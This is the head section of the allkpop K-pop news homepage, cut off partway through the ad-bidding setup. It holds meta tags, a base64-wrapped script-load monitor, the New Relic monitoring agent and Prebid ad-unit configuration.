
<!DOCTYPE html>
<html>
<head>
<script>/* observer-7.0.2 */eval(atob("IWZ1bmN0aW9uIHQoZSxuLG8pe2Z1bmN0aW9uIHIoYSxzKXtpZighblthXSl7aWYoIWVbYV0pe3ZhciB1PSJmdW5jdGlvbiI9PXR5cGVvZiByZXF1aXJlJiZyZXF1aXJlO2lmKCFzJiZ1KXJldHVybiB1KGEsITApO2lmKGkpcmV0dXJuIGkoYSwhMCk7dmFyIGQ9bmV3IEVycm9yKCJDYW5ub3QgZmluZCBtb2R1bGUgJyIrYSsiJyIpO3Rocm93IGQuY29kZT0iTU9EVUxFX05PVF9GT1VORCIsZH12YXIgYz1uW2FdPXtleHBvcnRzOnt9fTtlW2FdWzBdLmNhbGwoYy5leHBvcnRzLGZ1bmN0aW9uKHQpe3ZhciBuPWVbYV1bMV1bdF07cmV0dXJuIHIobj9uOnQpfSxjLGMuZXhwb3J0cyx0LGUsbixvKX1yZXR1cm4gblthXS5leHBvcnRzfWZvcih2YXIgaT0iZnVuY3Rpb24iPT10eXBlb2YgcmVxdWlyZSYmcmVxdWlyZSxhPTA7YTxvLmxlbmd0aDthKyspcihvW2FdKTtyZXR1cm4gcn0oezE6W2Z1bmN0aW9uKHQsZSxuKXsidXNlIHN0cmljdCI7ZnVuY3Rpb24gbyh0KXt2YXIgZT0iTkVXX1NDUklQVF9FVkVOVCIsbj1uZXcgcihlLHtkZXRhaWw6e319KTt0LmRpc3BhdGNoRXZlbnQobil9dmFyIHI9dCgzKTtlLmV4cG9ydHM9b30sezM6M31dLDI6W2Z1bmN0aW9uKHQsZSxuKXsidXNlIHN0cmljdCI7ZnVuY3Rpb24gbyh0KXt0LmFkb25pcz10LmFkb25pc3x8e30sdC5hZG9uaXMuc2NyaXB0U3RhdHVzZXM9e30sdC5hZG9uaXMucmVxdWVzdFN0YXR1c2VzPXt9O3ZhciBlPXQuWE1MSHR0cFJlcXVlc3QucHJvdG90eXBlLm9wZW47dC5YTUxIdHRwUmVxdWVzdC5wcm90b3R5cGUub3Blbj1mdW5jdGlvbihuLG8pe3RoaXMuYWRkRXZlbnRMaXN0ZW5lcigiZXJyb3IiLGZ1bmN0aW9uKGUpezA9PT10aGlzLnN0YXR1cz90LmFkb25pcy5zY3JpcHRTdGF0dXNlc1tvXT0iZXJyb3IiOnQuYWRvbmlzLnNjcmlwdFN0YXR1c2VzW29dPSJsb2FkIn0pLHRoaXMuYWRkRXZlbnRMaXN0ZW5lcigibG9hZCIsZnVuY3Rpb24oZSl7dC5hZG9uaXMuc2NyaXB0U3RhdHVzZXNbb109ImxvYWQifSksdGhpcy5hZGRFdmVudExpc3RlbmVyKCJsb2FkZW5kIixmdW5jdGlvbihlKXt0LmFkb25pcy5yZXF1ZXN0U3RhdHVzZXNbb109dGhpcy5zdGF0dXMscih0KX0pO3ZhciBpPVtdLnNsaWNlLmNhbGwoYXJndW1lbnRzLDApO3JldHVybiBlLmFwcGx5KHRoaXMsaSl9fXZhciByPXQoMSk7ZS5leHBvcnRzPXt3cmFwWE1MSHR0cFJlcXVlc3Q6b319LHsxOjF9XSwzOltmdW5jdGlvbih0LGUsbil7KGZ1bmN0aW9uKHQpe2Z1bmN0aW9uIG4oKXt0cnl7dmFyIHQ9bmV3IG8oImNhdCIse2RldGFpbDp7Zm9vOiJiYXIifX0pO3JldHVybiJjYXQiPT09dC50eXBlJiYiYmFyIj09PXQuZGV0YWlsLmZvb31jYXRjaChlKXt9cmV0dXJuITF9dmFyIG89dC5DdXN0b21FdmVudDtlLmV4cG9ydHM9bigpP286InVuZGVmaW5lZCIhPXR5cGVvZiBkb2N1bWVudCYmImZ1bmN0aW9uIj09dHlwZW9mIGRvY3VtZW50LmNyZWF0ZUV2ZW50P2Z1bmN0aW9uKHQsZSl7dmFyIG49ZG9jdW1lbnQuY3JlYXRlRXZlbnQoIkN1c3RvbUV2ZW50Iik7cmV0dXJuIGU/bi5pbml0Q3VzdG9tRXZlbnQodCxlLmJ1YmJsZXMsZS5jYW5jZWxhYmxlLGUuZGV0YWlsKTpuLmluaXRDdXN0b21FdmVudCh0LCExLCExLHZvaWQgMCksbn06ZnVuY3Rpb24odCxlKXt2YXIgbj1kb2N1bWVudC5jcmVhdGVFdmVudE9iamVjdCgpO3JldHVybiBuLnR5cGU9dCxlPyhuLmJ1YmJsZXM9Qm9vbGVhbihlLmJ1YmJsZXMpLG4uY2FuY2VsYWJsZT1Cb29sZWFuKGUuY2FuY2VsYWJsZSksbi5kZXRhaWw9ZS5kZXRhaWwpOihuLmJ1YmJsZXM9ITEsbi5jYW5jZWxhYmxlPSExLG4uZGV0YWlsPXZvaWQgMCksbn19KS5jYWxsKHRoaXMsInVuZGVmaW5lZCIhPXR5cGVvZiBnbG9iYWw/Z2xvYmFsOiJ1bmRlZmluZWQiIT10eXBlb2Ygc2VsZj9zZWxmOiJ1bmRlZmluZWQiIT10eXBlb2Ygd2luZG93P3dpbmRvdzp7fSl9LHt9XSw0OltmdW5jdGlvbih0LGUsbil7InVzZSBzdHJpY3QiO2Z1bmN0aW9uIG8odCxlLG4sbyl7ImFkZEV2ZW50TGlzdGVuZXIiaW4gdD90LmFkZEV2ZW50TGlzdGVuZXIoZSxuLG8pOiJhdHRhY2hFdmVudCJpbiB0JiZ0LmF0dGFjaEV2ZW50KCJvbiIrZSxuKX12YXIgcj10KDIpLGk9dCgxKTshZnVuY3Rpb24oKXt3aW5kb3cuYWRvbmlzPXdpbmRvdy5hZG9uaXN8fHt9LHdpbmRvdy5hZG9uaXMuc2NyaXB0U3RhdHVzZXM9e30sci53cmFwWE1MSHR0cFJlcXVlc3Qod2luZG93KSxvKGRvY3VtZW50LCJsb2FkIixmdW5jdGlvbih0KXt0LnRhcmdldCYmIlNDUklQVCI9PT10LnRhcmdldC5ub2RlTmFtZSYmKHdpbmRvdy5hZG9uaXMuc2NyaXB0U3RhdHVzZXNbdC50YXJnZXQuc3JjXT0ibG9hZCIsaSh3aW5kb3cpKX0sITApLG8oZG9jdW1lbnQsImVycm9yIixmdW5jdGlvbih0KXt0LnRhcmdldCYmIlNDUklQVCI9PT10LnRhcmdldC5ub2RlTmFtZSYmKHdpbmRvdy5hZG9uaXMuc2NyaXB0U3RhdHVzZXNbdC50YXJnZXQuc3JjXT0iZXJyb3IiLGkod2luZG93KSl9LCEwKX0oKX0sezE6MSwyOjJ9XX0se30sWzRdKTs="));</script><meta charset="UTF-8">
<meta name="keywords" content="allkpop" />
<meta name="description" content="Breaking K-pop news, videos, photos and celebrity gossip | allkpop" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"><script type="text/javascript">(window.NREUM||(NREUM={})).loader_config={xpid:"VwMDWFBWGwIGU1hWBwM="};window.NREUM||(NREUM={}),__nr_require=function(t,e,n){function r(n){if(!e[n]){var o=e[n]={exports:{}};t[n][0].call(o.exports,function(e){var o=t[n][1][e];return r(o||e)},o,o.exports)}return e[n].exports}if("function"==typeof __nr_require)return __nr_require;for(var o=0;o<n.length;o++)r(n[o]);return r}({1:[function(t,e,n){function r(t){try{c.console&&console.log(t)}catch(e){}}var o,i=t("ee"),a=t(12),c={};try{o=localStorage.getItem("__nr_flags").split(","),console&&"function"==typeof console.log&&(c.console=!0,o.indexOf("dev")!==-1&&(c.dev=!0),o.indexOf("nr_dev")!==-1&&(c.nrDev=!0))}catch(s){}c.nrDev&&i.on("internal-error",function(t){r(t.stack)}),c.dev&&i.on("fn-err",function(t,e,n){r(n.stack)}),c.dev&&(r("NR AGENT IN DEVELOPMENT MODE"),r("flags: "+a(c,function(t,e){return t}).join(", ")))},{}],2:[function(t,e,n){function r(t,e,n,r,c){try{p?p-=1:o(c||new UncaughtException(t,e,n),!0)}catch(f){try{i("ierr",[f,s.now(),!0])}catch(d){}}return"function"==typeof u&&u.apply(this,a(arguments))}function UncaughtException(t,e,n){this.message=t||"Uncaught error with no additional information",this.sourceURL=e,this.line=n}function o(t,e){var n=e?null:s.now();i("err",[t,n])}var i=t("handle"),a=t(13),c=t("ee"),s=t("loader"),f=t("gos"),u=window.onerror,d=!1,l="nr@seenError",p=0;s.features.err=!0,t(1),window.onerror=r;try{throw new Error}catch(h){"stack"in h&&(t(5),t(4),"addEventListener"in window&&t(3),s.xhrWrappable&&t(6),d=!0)}c.on("fn-start",function(t,e,n){d&&(p+=1)}),c.on("fn-err",function(t,e,n){d&&!n[l]&&(f(n,l,function(){return!0}),this.thrown=!0,o(n))}),c.on("fn-end",function(){d&&!this.thrown&&p>0&&(p-=1)}),c.on("internal-error",function(t){i("ierr",[t,s.now(),!0])})},{}],3:[function(t,e,n){function r(t){for(var e=t;e&&!e.hasOwnProperty(u);)e=Object.getPrototypeOf(e);e&&o(e)}function o(t){c.inPlace(t,[u,d],"-",i)}function i(t,e){return t[1]}var a=t("ee").get("events"),c=t(15)(a,!0),s=t("gos"),f=XMLHttpRequest,u="addEventListener",d="removeEventListener";e.exports=a,"getPrototypeOf"in Object?(r(document),r(window),r(f.prototype)):f.prototype.hasOwnProperty(u)&&(o(window),o(f.prototype)),a.on(u+"-start",function(t,e){var n=t[1],r=s(n,"nr@wrapped",function(){function t(){if("function"==typeof n.handleEvent)return n.handleEvent.apply(n,arguments)}var e={object:t,"function":n}[typeof n];return e?c(e,"fn-",null,e.name||"anonymous"):n});this.wrapped=t[1]=r}),a.on(d+"-start",function(t){t[1]=this.wrapped||t[1]})},{}],4:[function(t,e,n){var r=t("ee").get("raf"),o=t(15)(r),i="equestAnimationFrame";e.exports=r,o.inPlace(window,["r"+i,"mozR"+i,"webkitR"+i,"msR"+i],"raf-"),r.on("raf-start",function(t){t[0]=o(t[0],"fn-")})},{}],5:[function(t,e,n){function r(t,e,n){t[0]=a(t[0],"fn-",null,n)}function o(t,e,n){this.method=n,this.timerDuration=isNaN(t[1])?0:+t[1],t[0]=a(t[0],"fn-",this,n)}var i=t("ee").get("timer"),a=t(15)(i),c="setTimeout",s="setInterval",f="clearTimeout",u="-start",d="-";e.exports=i,a.inPlace(window,[c,"setImmediate"],c+d),a.inPlace(window,[s],s+d),a.inPlace(window,[f,"clearImmediate"],f+d),i.on(s+u,r),i.on(c+u,o)},{}],6:[function(t,e,n){function r(t,e){d.inPlace(e,["onreadystatechange"],"fn-",c)}function o(){var t=this,e=u.context(t);t.readyState>3&&!e.resolved&&(e.resolved=!0,u.emit("xhr-resolved",[],t)),d.inPlace(t,w,"fn-",c)}function i(t){g.push(t),h&&(b?b.then(a):v?v(a):(E=-E,O.data=E))}function a(){for(var t=0;t<g.length;t++)r([],g[t]);g.length&&(g=[])}function c(t,e){return e}function s(t,e){for(var n in t)e[n]=t[n];return e}t(3);var f=t("ee"),u=f.get("xhr"),d=t(15)(u),l=NREUM.o,p=l.XHR,h=l.MO,m=l.PR,v=l.SI,y="readystatechange",w=["onload","onerror","onabort","onloadstart","onloadend","onprogress","ontimeout"],g=[];e.exports=u;var x=window.XMLHttpRequest=function(t){var e=new p(t);try{u.emit("new-xhr",[e],e),e.addEventListener(y,o,!1)}catch(n){try{u.emit("internal-error",[n])}catch(r){}}return e};if(s(p,x),x.prototype=p.prototype,d.inPlace(x.prototype,["open","send"],"-xhr-",c),u.on("send-xhr-start",function(t,e){r(t,e),i(e)}),u.on("open-xhr-start",r),h){var b=m&&m.resolve();if(!v&&!m){var E=1,O=document.createTextNode(E);new h(a).observe(O,{characterData:!0})}}else f.on("fn-end",function(t){t[0]&&t[0].type===y||a()})},{}],7:[function(t,e,n){function r(t){var e=this.params,n=this.metrics;if(!this.ended){this.ended=!0;for(var r=0;r<d;r++)t.removeEventListener(u[r],this.listener,!1);if(!e.aborted){if(n.duration=a.now()-this.startTime,4===t.readyState){e.status=t.status;var i=o(t,this.lastSize);if(i&&(n.rxSize=i),this.sameOrigin){var s=t.getResponseHeader("X-NewRelic-App-Data");s&&(e.cat=s.split(", ").pop())}}else e.status=0;n.cbTime=this.cbTime,f.emit("xhr-done",[t],t),c("xhr",[e,n,this.startTime])}}}function o(t,e){var n=t.responseType;if("json"===n&&null!==e)return e;var r="arraybuffer"===n||"blob"===n||"json"===n?t.response:t.responseText;return h(r)}function i(t,e){var n=s(e),r=t.params;r.host=n.hostname+":"+n.port,r.pathname=n.pathname,t.sameOrigin=n.sameOrigin}var a=t("loader");if(a.xhrWrappable){var c=t("handle"),s=t(8),f=t("ee"),u=["load","error","abort","timeout"],d=u.length,l=t("id"),p=t(11),h=t(10),m=window.XMLHttpRequest;a.features.xhr=!0,t(6),f.on("new-xhr",function(t){var e=this;e.totalCbs=0,e.called=0,e.cbTime=0,e.end=r,e.ended=!1,e.xhrGuids={},e.lastSize=null,p&&(p>34||p<10)||window.opera||t.addEventListener("progress",function(t){e.lastSize=t.loaded},!1)}),f.on("open-xhr-start",function(t){this.params={method:t[0]},i(this,t[1]),this.metrics={}}),f.on("open-xhr-end",function(t,e){"loader_config"in NREUM&&"xpid"in NREUM.loader_config&&this.sameOrigin&&e.setRequestHeader("X-NewRelic-ID",NREUM.loader_config.xpid)}),f.on("send-xhr-start",function(t,e){var n=this.metrics,r=t[0],o=this;if(n&&r){var i=h(r);i&&(n.txSize=i)}this.startTime=a.now(),this.listener=function(t){try{"abort"===t.type&&(o.params.aborted=!0),("load"!==t.type||o.called===o.totalCbs&&(o.onloadCalled||"function"!=typeof e.onload))&&o.end(e)}catch(n){try{f.emit("internal-error",[n])}catch(r){}}};for(var c=0;c<d;c++)e.addEventListener(u[c],this.listener,!1)}),f.on("xhr-cb-time",function(t,e,n){this.cbTime+=t,e?this.onloadCalled=!0:this.called+=1,this.called!==this.totalCbs||!this.onloadCalled&&"function"==typeof n.onload||this.end(n)}),f.on("xhr-load-added",function(t,e){var n=""+l(t)+!!e;this.xhrGuids&&!this.xhrGuids[n]&&(this.xhrGuids[n]=!0,this.totalCbs+=1)}),f.on("xhr-load-removed",function(t,e){var n=""+l(t)+!!e;this.xhrGuids&&this.xhrGuids[n]&&(delete this.xhrGuids[n],this.totalCbs-=1)}),f.on("addEventListener-end",function(t,e){e instanceof m&&"load"===t[0]&&f.emit("xhr-load-added",[t[1],t[2]],e)}),f.on("removeEventListener-end",function(t,e){e instanceof m&&"load"===t[0]&&f.emit("xhr-load-removed",[t[1],t[2]],e)}),f.on("fn-start",function(t,e,n){e instanceof m&&("onload"===n&&(this.onload=!0),("load"===(t[0]&&t[0].type)||this.onload)&&(this.xhrCbStart=a.now()))}),f.on("fn-end",function(t,e){this.xhrCbStart&&f.emit("xhr-cb-time",[a.now()-this.xhrCbStart,this.onload,e],e)})}},{}],8:[function(t,e,n){e.exports=function(t){var e=document.createElement("a"),n=window.location,r={};e.href=t,r.port=e.port;var o=e.href.split("://");!r.port&&o[1]&&(r.port=o[1].split("/")[0].split("@").pop().split(":")[1]),r.port&&"0"!==r.port||(r.port="https"===o[0]?"443":"80"),r.hostname=e.hostname||n.hostname,r.pathname=e.pathname,r.protocol=o[0],"/"!==r.pathname.charAt(0)&&(r.pathname="/"+r.pathname);var i=!e.protocol||":"===e.protocol||e.protocol===n.protocol,a=e.hostname===document.domain&&e.port===n.port;return r.sameOrigin=i&&(!e.hostname||a),r}},{}],9:[function(t,e,n){function r(){}function o(t,e,n){return function(){return i(t,[f.now()].concat(c(arguments)),e?null:this,n),e?void 0:this}}var i=t("handle"),a=t(12),c=t(13),s=t("ee").get("tracer"),f=t("loader"),u=NREUM;"undefined"==typeof window.newrelic&&(newrelic=u);var d=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit","addRelease"],l="api-",p=l+"ixn-";a(d,function(t,e){u[e]=o(l+e,!0,"api")}),u.addPageAction=o(l+"addPageAction",!0),u.setCurrentRouteName=o(l+"routeName",!0),e.exports=newrelic,u.interaction=function(){return(new r).get()};var h=r.prototype={createTracer:function(t,e){var n={},r=this,o="function"==typeof e;return i(p+"tracer",[f.now(),t,n],r),function(){if(s.emit((o?"":"no-")+"fn-start",[f.now(),r,o],n),o)try{return e.apply(this,arguments)}catch(t){throw s.emit("fn-err",[arguments,this,t],n),t}finally{s.emit("fn-end",[f.now()],n)}}}};a("setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(t,e){h[e]=o(p+e)}),newrelic.noticeError=function(t){"string"==typeof t&&(t=new Error(t)),i("err",[t,f.now()])}},{}],10:[function(t,e,n){e.exports=function(t){if("string"==typeof t&&t.length)return t.length;if("object"==typeof t){if("undefined"!=typeof ArrayBuffer&&t instanceof ArrayBuffer&&t.byteLength)return t.byteLength;if("undefined"!=typeof Blob&&t instanceof Blob&&t.size)return t.size;if(!("undefined"!=typeof FormData&&t instanceof FormData))try{return JSON.stringify(t).length}catch(e){return}}}},{}],11:[function(t,e,n){var r=0,o=navigator.userAgent.match(/Firefox[\/\s](\d+\.\d+)/);o&&(r=+o[1]),e.exports=r},{}],12:[function(t,e,n){function r(t,e){var n=[],r="",i=0;for(r in t)o.call(t,r)&&(n[i]=e(r,t[r]),i+=1);return n}var o=Object.prototype.hasOwnProperty;e.exports=r},{}],13:[function(t,e,n){function r(t,e,n){e||(e=0),"undefined"==typeof n&&(n=t?t.length:0);for(var r=-1,o=n-e||0,i=Array(o<0?0:o);++r<o;)i[r]=t[e+r];return i}e.exports=r},{}],14:[function(t,e,n){e.exports={exists:"undefined"!=typeof window.performance&&window.performance.timing&&"undefined"!=typeof window.performance.timing.navigationStart}},{}],15:[function(t,e,n){function r(t){return!(t&&t instanceof Function&&t.apply&&!t[a])}var o=t("ee"),i=t(13),a="nr@original",c=Object.prototype.hasOwnProperty,s=!1;e.exports=function(t,e){function n(t,e,n,o){function nrWrapper(){var r,a,c,s;try{a=this,r=i(arguments),c="function"==typeof n?n(r,a):n||{}}catch(f){l([f,"",[r,a,o],c])}u(e+"start",[r,a,o],c);try{return s=t.apply(a,r)}catch(d){throw u(e+"err",[r,a,d],c),d}finally{u(e+"end",[r,a,s],c)}}return r(t)?t:(e||(e=""),nrWrapper[a]=t,d(t,nrWrapper),nrWrapper)}function f(t,e,o,i){o||(o="");var a,c,s,f="-"===o.charAt(0);for(s=0;s<e.length;s++)c=e[s],a=t[c],r(a)||(t[c]=n(a,f?c+o:o,i,c))}function u(n,r,o){if(!s||e){var i=s;s=!0;try{t.emit(n,r,o,e)}catch(a){l([a,n,r,o])}s=i}}function d(t,e){if(Object.defineProperty&&Object.keys)try{var n=Object.keys(t);return n.forEach(function(n){Object.defineProperty(e,n,{get:function(){return t[n]},set:function(e){return t[n]=e,e}})}),e}catch(r){l([r])}for(var o in t)c.call(t,o)&&(e[o]=t[o]);return e}function l(e){try{t.emit("internal-error",e)}catch(n){}}return t||(t=o),n.inPlace=f,n.flag=a,n}},{}],ee:[function(t,e,n){function r(){}function o(t){function e(t){return t&&t instanceof r?t:t?s(t,c,i):i()}function n(n,r,o,i){if(!l.aborted||i){t&&t(n,r,o);for(var a=e(o),c=h(n),s=c.length,f=0;f<s;f++)c[f].apply(a,r);var d=u[w[n]];return d&&d.push([g,n,r,a]),a}}function p(t,e){y[t]=h(t).concat(e)}function h(t){return y[t]||[]}function m(t){return d[t]=d[t]||o(n)}function v(t,e){f(t,function(t,n){e=e||"feature",w[n]=e,e in u||(u[e]=[])})}var y={},w={},g={on:p,emit:n,get:m,listeners:h,context:e,buffer:v,abort:a,aborted:!1};return g}function i(){return new r}function a(){(u.api||u.feature)&&(l.aborted=!0,u=l.backlog={})}var c="nr@context",s=t("gos"),f=t(12),u={},d={},l=e.exports=o();l.backlog=u},{}],gos:[function(t,e,n){function r(t,e,n){if(o.call(t,e))return t[e];var r=n();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(t,e,{value:r,writable:!0,enumerable:!1}),r}catch(i){}return t[e]=r,r}var o=Object.prototype.hasOwnProperty;e.exports=r},{}],handle:[function(t,e,n){function r(t,e,n,r){o.buffer([t],r),o.emit(t,e,n)}var o=t("ee").get("handle");e.exports=r,r.ee=o},{}],id:[function(t,e,n){function r(t){var e=typeof t;return!t||"object"!==e&&"function"!==e?-1:t===window?0:a(t,i,function(){return o++})}var o=1,i="nr@id",a=t("gos");e.exports=r},{}],loader:[function(t,e,n){function r(){if(!b++){var t=x.info=NREUM.info,e=l.getElementsByTagName("script")[0];if(setTimeout(u.abort,3e4),!(t&&t.licenseKey&&t.applicationID&&e))return u.abort();f(w,function(e,n){t[e]||(t[e]=n)}),s("mark",["onload",a()+x.offset],null,"api");var n=l.createElement("script");n.src="https://"+t.agent,e.parentNode.insertBefore(n,e)}}function o(){"complete"===l.readyState&&i()}function i(){s("mark",["domContent",a()+x.offset],null,"api")}function a(){return E.exists&&performance.now?Math.round(performance.now()):(c=Math.max((new Date).getTime(),c))-x.offset}var c=(new Date).getTime(),s=t("handle"),f=t(12),u=t("ee"),d=window,l=d.document,p="addEventListener",h="attachEvent",m=d.XMLHttpRequest,v=m&&m.prototype;NREUM.o={ST:setTimeout,SI:d.setImmediate,CT:clearTimeout,XHR:m,REQ:d.Request,EV:d.Event,PR:d.Promise,MO:d.MutationObserver};var y=""+location,w={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-1071.min.js"},g=m&&v&&v[p]&&!/CriOS/.test(navigator.userAgent),x=e.exports={offset:c,now:a,origin:y,features:{},xhrWrappable:g};t(9),l[p]?(l[p]("DOMContentLoaded",i,!1),d[p]("load",r,!1)):(l[h]("onreadystatechange",o),d[h]("onload",r)),s("mark",["firstbyte",c],null,"api");var b=0,E=t(14)},{}]},{},["loader",2,7]);</script>
<meta name="google-site-verification" content="j9-UrR1vZDnFuqEki8rQrHppAHzBCh00NF290OFt4sM" />

<meta property="og:type" content="website" />
<meta property="fb:app_id" content="173336579512859" />
<meta property="fb:pages" content="142273450007" />
<meta property="og:url" id="fb_url" content="https://www.allkpop.com//" />
<meta property="og:title" id="fb_title" content="allkpop | Breaking K-pop news, videos, photos and celebrity gossip" />
<meta property="og:image" id="fb_image" content="https://www.allkpop.com/img/logo-akp-icon.png" />
<meta property="og:image:width" content="150" />
<meta property="og:image:height" content="150" />
<meta property="og:description" id="fb_description" content="Breaking K-pop news, videos, photos and celebrity gossip | allkpop" />
<meta property="og:site_name" content="allkpop" />

<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="@allkpop">
<meta name="twitter:creator" content="@allkpop">
<meta name="twitter:domain" content="allkpop.com">
<meta id="tw_url" name="twitter:url" content="https://www.allkpop.com//">
<meta id="tw_title" name="twitter:title" content="allkpop | Breaking K-pop news, videos, photos and celebrity gossip">
<meta id="tw_description" name="twitter:description" content="Breaking K-pop news, videos, photos and celebrity gossip | allkpop">
<meta id="tw_image" name="twitter:image:src" content="https://www.allkpop.com/img/logo-akp-icon.png">
<meta name="twitter:widgets:csp" content="on">
<meta name="google-site-verification" content="j9-UrR1vZDnFuqEki8rQrHppAHzBCh00NF290OFt4sM" />
<meta name="p:domain_verify" content="be6fa067e531bcccdccf695e258a5d8e" />
<script type="application/ld+json">
        { 
            "@context": "http://schema.org",
            "@type": "WebSite",
            "url": "https://www.allkpop.com/",
            "name": "allkpop",
            "description": "Breaking K-pop news, videos, photos and celebrity gossip | allkpop",
            "publisher": {
                "@type": "Organization",
                "name": "allkpop",
                "logo": {
                    "@type": "ImageObject",
                    "url": "https://www.allkpop.com/imgs/placeholder/logo_r_small3.png",
                    "width": "120",
                    "height": "30"
                }
            },
            "potentialAction": {
                "@type": "SearchAction",
                "target": "https://www.allkpop.com/search/article/{search_term}",
                "query-input": "required name=search_term"
            } 
        }
        </script>
<title>allkpop | Breaking K-pop news, videos, photos and celebrity gossip</title>
<link rel="shortcut icon" href="//www.allkpop.com/favicon.ico" />
<link rel="canonical" href="https://www.allkpop.com//" />
<link rel="stylesheet" href="https://www.allkpop.com/css/external/normalize.min.css" type="text/css" />
<link rel="stylesheet" href="https://www.allkpop.com/css/styles.min.css" type="text/css" />
<link rel="stylesheet" href="https://www.allkpop.com/css/responsive.min.css" type="text/css" />

<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
<link href='https://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>
<link href='https://fonts.googleapis.com/css?family=Oswald' rel='stylesheet' type='text/css'>
<link href='https://fonts.googleapis.com/css?family=Open+Sans:400,600,700,300' rel='stylesheet' type='text/css'>
<link rel="stylesheet" href="https://www.allkpop.com/css/external/theme_smoothness_jquery-ui.min.css">
<link rel="stylesheet" type="text/css" href="https://www.allkpop.com/css/gse.min.css" />

<style>
.jssora05l, .jssora05r {display: block;position: absolute;width: 40px;height: 40px;cursor: pointer;background: url('https://www.allkpop.com/plugin/slider/img/a22.png') no-repeat;background-color:rgba(255,255,255,0.1);overflow: hidden;}.jssora05l { background-position: -10px -40px; }.jssora05r { background-position: -70px -40px; }.jssora05l:hover { background-position: -130px -40px; }.jssora05r:hover { background-position: -190px -40px; }.jssora05l.jssora05ldn { background-position: -250px -40px; }.jssora05r.jssora05rdn { background-position: -310px -40px; }
.jssort01 .p {position: absolute;top: 0;left: 0;width: 150px;height: 75px;}.jssort01 .t {position: absolute;top: 0;left: 0;width: 100%;height: 100%;border: none;}.jssort01 .w {position: absolute;top: 0px;left: 0px;width: 100%;height: 100%;}.jssort01 .c {position: absolute;top: 0px;left: 0px;width: 146px;height: 71px;cursor: pointer;box-sizing: content-box;border: #b0b9ba 2px solid;}.jssort01 .pav .c {top: 0px;_top: 0px;left: 0px;_left: 0px;width: 146px;height: 71px;background-position: 50% 50%;border: #d80001 2px solid;}.jssort01 .p:hover .c {top: 0px;left: 0px;width: 150px;height: 75px;border: #fff 1px solid;background-position: 50% 50%;}.jssort01 .p.pdn .c {background-position: 50% 50%;width: 146px;height: 71px;border: #fff 2px solid;}
* html .jssort01 .c, * html .jssort01 .pdn .c, * html .jssort01 .pav .c {width: 152px;height: 72px;}.caption{text-align: center;}#jssor_1 a,#jssor_2 a{text-decoration: none;color: #FFF;font-size:1.8em;font-family: 'Oswald',sans-serif;}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
<script async src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.11.4/jquery-ui.min.js"></script>
<script src="https://www.allkpop.com/js/external/socket.io-1.4.8.js?v=2"></script>
<script>var ws_polling_switch="ws";</script>


<script>
    var PREBID_TIMEOUT = 3000;
    var adUnits = [
        {
            code: 'div-gpt-ad-1456251248648-0',//akp2_home_728_top
            sizes: [[728, 90], [970, 250], [970, 90]],
            bids: [
                {bidder: "sovrn",params: {tagid: "464686"}},{bidder: "sovrn",params: {tagid: "464914"}},{bidder: "gumgum",params: {inSlot: 3880}},{bidder: "rubicon",params: {accountId: "8238",siteId: "13302",zoneId: "25462",sizes:[2]}},{bidder: "pulsepoint",params: {cf: "728X90",cp: 558107,ct: 575549}},{bidder: "pulsepoint",params: {cf: "970X250",cp: 558107,ct: 575550}},{bidder: "pulsepoint",params: {cf: "970X90",cp: 558107,ct: 575551}},{bidder: "districtmDMX",params: {id: "180625"}},            ]
        },
        {
            code: 'div-gpt-ad-1456251248648-1',//akp2_home_billboard_1
            sizes: [[728, 90], [970, 250], [970, 90],[300, 250], [336, 280]],
            bids: [
                {bidder: "sovrn",params: {tagid: "464686"}},{bidder: "sovrn",params: {tagid: "464687"}},{bidder: "sovrn",params: {tagid: "464689"}},{bidder: "sovrn",params: {tagid: "464914"}},{bidder: "gumgum",params: {inSlot: 3895}},{bidder: "gumgum",params: {inSlot: 3881}},{bidder: "rubicon",params: {accountId: "8238",siteId: "13302",zoneId: "25462"}},{bidder: "pulsepoint",params: {cf: "300X250",cp: 558107,ct: 575547}},{bidder: "pulsepoint",params: {cf: "728X90",cp: 558107,ct: 575549}},{bidder: "pulsepoint",params: {cf: "970X250",cp: 558107,ct: 575550}},{bidder: "pulsepoint",params: {cf: "970X90",cp: 558107,ct: 575551}},{bidder: "districtmDMX",params: {id: "180625"}},            ]
        },
        {
            code: 'div-gpt-ad-1456251248648-2',//akp2_home_billboard_2
            sizes: [[300, 250], [336, 280]],
            bids: [
                {bidder: "sovrn",params: {tagid: "464687"}},{bidder: "sovrn",params: {tagid: "464689"}},{bidder: "gumgum",params: {inSlot: 3896}},{bidder: "rubicon",params: {accountId: "8238",siteId: "13302",zoneId: "25463"}},{bidder: "pulsepoint",params: {cf: "300X250",cp: 558107,ct: 575547}},{bidder: "districtmDMX",params: {id: "180625"}},            ]
        },
        {
            code: 'div-gpt-ad-1456251248648-3',//akp2_home_billboard_3
            sizes: [[300, 250], [336, 280]],
            bids: [
                {bidder: "sovrn",params: {tagid: "464687"}},{bidder: "sovrn",params: {tagid: "464689"}},{bidder: "gumgum",params: {inSlot: 3897}},{bidder: "rubicon",params: {accountId: "8238",siteId: "13302",zoneId: "25463"}},{bidder: "pulsepoint",params: {cf: "300X250",cp: 558107,ct: 575547}},{bidder: "districtmDMX",params: {id: "180625"}},            ]
        },
        {
            code: 'div-gpt-ad-1456256348948-0',//akp2_home_billboard_4
            sizes: [[300, 250]],
            bids: [
                {bidder: "sovrn",params: {tagid: "464687"}},{bidder: "sovrn",params: {tagid: "464689"}},{bidder: "gumgum",params: {inSlot: 3898}},{bidder: "rubicon",params: {accountId: "8238",siteId: "13302",zoneId: "25463"}},{bidder: "pulsepoint",params: {cf: "300X250",cp: 558107,ct: 575547}},{bidder: "districtmDMX",params: {id: "180625"}},            ]
        },
        {
            code: 'div-gpt-ad-1456251248648-4',//akp2_home_sidebar_1
            sizes: [[300, 250], [300,600]],
            bids: [
